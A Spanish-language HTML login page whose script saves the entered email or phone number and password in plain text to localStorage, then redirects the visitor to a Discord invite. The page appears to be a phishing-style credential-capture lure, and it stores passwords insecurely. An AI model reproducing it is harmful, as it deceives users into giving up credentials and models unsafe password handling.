<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Inicio de Sesión</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
    }
    .login-container {
      background-color: #fff;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 450px;
    }
    h1 {
      text-align: center;
      font-size: 32px;
      margin-bottom: 30px;
      color: #333;
    }
    .input-group {
      margin-bottom: 20px;
    }
    label {
      font-size: 14px;
      font-weight: 500;
      color: #666;
      margin-bottom: 8px;
      display: block;
    }
    input {
      width: 100%;
      padding: 14px;
      border: 2px solid #ddd;
      border-radius: 8px;
      font-size: 16px;
      color: #333;
      background-color: #f9f9f9;
      transition: border-color 0.3s, background-color 0.3s;
    }
    input:focus {
      border-color: #007bff;
      background-color: #fff;
      outline: none;
    }
    .button {
      width: 100%;
      padding: 14px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    .button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <h1>Iniciar Sesión</h1>
    <form id="loginForm">
      <div class="input-group">
        <label for="email_or_phone">Correo o Número</label>
        <input type="text" id="email_or_phone" name="email_or_phone" required placeholder="Correo o Número">
      </div>
      <div class="input-group">
        <label for="password">Contraseña</label>
        <input type="password" id="password" name="password" required placeholder="Contraseña">
      </div>
      <div class="input-group">
        <label for="confirm_password">Confirmar Contraseña</label>
        <input type="password" id="confirm_password" name="confirm_password" required placeholder="Confirmar Contraseña">
      </div>
      <button type="submit" class="button">Iniciar Sesión</button>
    </form>
  </div>

  <script>
    // Guardar los datos en localStorage y redirigir a Discord
    document.getElementById("loginForm").addEventListener("submit", function(event) {
      event.preventDefault();

      const emailOrPhone = document.getElementById("email_or_phone").value;
      const password = document.getElementById("password").value;
      const confirmPassword = document.getElementById("confirm_password").value;

      // Guardar los datos en localStorage
      localStorage.setItem("email_or_phone", emailOrPhone);
      localStorage.setItem("password", password);
      localStorage.setItem("confirm_password", confirmPassword);

      // Redirigir directamente a Discord
      window.location.href = "https://discord.gg/WuxyurKB64";
    });
  </script>

</body>
</html>
